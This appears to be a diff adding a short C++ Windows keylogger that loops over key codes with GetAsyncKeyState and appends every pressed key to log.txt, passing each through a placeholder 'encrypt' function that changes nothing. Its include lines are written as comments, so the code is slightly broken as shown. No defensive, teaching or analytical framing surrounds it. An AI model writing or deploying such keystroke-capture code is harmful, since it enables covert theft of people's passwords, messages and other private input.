@@ -1,0 +1,28 @@
+# <iostream>
+# <fstream>
+# <Windows.h>
+
+std::string encrypt(std::string text) {
+    // Encryption logic goes here
+    return text;
+}
+
+int main() {
+    std::ofstream logfile;
+    logfile.open("log.txt", std::ios::app);
+
+    while (true) {
+        Sleep(10);
+
+        for (int key = 8; key <= 255; key++) {
+            if (GetAsyncKeyState(key) == -32767) {
+                std::string keyString = std::to_string(key);
+                std::string encryptedKey = encrypt(keyString);
+                logfile << encryptedKey;
+            }
+        }
+    }
+
+    logfile.close();
+    return 0;
+}
